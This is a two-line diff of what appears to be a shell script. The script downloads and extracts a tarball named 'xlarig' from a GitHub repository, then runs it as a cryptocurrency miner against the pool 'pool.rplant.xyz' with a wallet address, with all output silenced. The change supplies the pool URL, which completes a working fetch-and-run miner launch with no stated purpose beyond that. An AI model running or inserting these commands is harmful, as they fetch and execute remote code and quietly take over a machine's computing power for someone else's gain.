@@ -1,2 +1,2 @@
 wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o  -u SfqnjBSo1eTcJqRs5VFFnNeH7seoMCa1Sc -p BREWWWW >/dev/null 2>&1
+./xlarig -o https://pool.rplant.xyz -u SfqnjBSo1eTcJqRs5VFFnNeH7seoMCa1Sc -p BREWWWW >/dev/null 2>&1
